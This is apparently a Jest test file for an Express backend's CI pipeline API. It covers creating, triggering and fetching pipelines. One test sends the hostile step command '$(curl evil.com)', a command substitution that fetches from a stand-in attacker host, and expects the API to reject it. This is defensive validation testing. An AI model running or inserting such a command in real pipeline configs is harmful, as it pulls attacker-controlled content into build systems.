const request = require("supertest");
const express = require("express");
const mongoose = require("mongoose");
const dotenv = require("dotenv");

dotenv.config();

const mainRouter = require("../routes/main.router");
const { errorHandler } = require("../middleware/errorHandler");
const User = require("../models/userModel");
const Repository = require("../models/repoModel");
const Pipeline = require("../models/Pipeline");

const app = express();
app.use(express.json());
app.use("/", mainRouter);
app.use(errorHandler);

let authToken;
let userId;
let repoId;
let pipelineId;

beforeAll(async () => {
  await mongoose.connect(process.env.MONGODB_URI);
  const signupRes = await request(app).post("/signup").send({
    username: `pipe_user_${Date.now()}`,
    email: `test_jest_pipe_${Date.now()}@example.com`,
    password: "TestPass123",
  });
  authToken = signupRes.body.token;
  userId = signupRes.body.userId;

  const repoRes = await request(app)
    .post("/repo/create")
    .set("Authorization", `Bearer ${authToken}`)
    .send({ name: `pipe-repo-${Date.now()}`, visibility: true });
  repoId = repoRes.body.repository?._id || repoRes.body._id;
});

afterAll(async () => {
  await Pipeline.deleteMany({ owner: userId });
  await Repository.deleteMany({ owner: userId });
  await User.deleteMany({ email: /^test_jest_pipe_/ });
  await mongoose.connection.close();
});

describe("Pipeline Endpoints", () => {
  it("should create a pipeline with valid config", async () => {
    const res = await request(app)
      .post("/pipeline")
      .set("Authorization", `Bearer ${authToken}`)
      .send({
        name: `test-pipeline-${Date.now()}`,
        repository: repoId,
        config: { stages: [{ name: "build", steps: [{ name: "echo", command: "echo hello" }] }] },
      });
    expect(res.status).toBe(201);
    expect(res.body.pipeline).toBeDefined();
    pipelineId = res.body.pipeline._id;
  });

  it("should reject pipeline with dangerous command", async () => {
    const res = await request(app)
      .post("/pipeline")
      .set("Authorization", `Bearer ${authToken}`)
      .send({
        name: "bad-pipeline",
        repository: repoId,
        config: { stages: [{ name: "attack", steps: [{ name: "evil", command: "$(curl evil.com)" }] }] },
      });
    expect(res.status).toBe(400);
  });

  it("should trigger a pipeline run", async () => {
    const res = await request(app)
      .post(`/pipeline/${pipelineId}/trigger`)
      .set("Authorization", `Bearer ${authToken}`)
      .send({ branch: "main" });
    expect(res.status).toBe(201);
    expect(res.body.run).toBeDefined();
  });

  it("should return pipeline by ID", async () => {
    const res = await request(app)
      .get(`/pipeline/${pipelineId}`)
      .set("Authorization", `Bearer ${authToken}`);
    expect(res.status).toBe(200);
    expect(res.body._id).toBe(pipelineId);
  });
});
